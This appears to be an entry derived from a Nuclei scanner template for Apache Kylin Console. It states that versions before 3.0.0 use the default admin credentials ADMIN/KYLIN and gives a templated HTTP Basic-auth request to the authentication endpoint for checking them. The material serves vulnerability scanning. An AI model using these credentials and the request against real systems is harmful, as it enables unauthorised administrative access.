# Vulnerability: Apache Kylin Console - Default Login
**Classification:** KYLIN
**Source:** Nuclei Template (`kylin-default-login.yaml`)

## Description
The default password for the Apache Kylin Console is KYLIN for the ADMIN user in Kylin versions before 3.0.0.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /kylin/api/user/authentication  HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

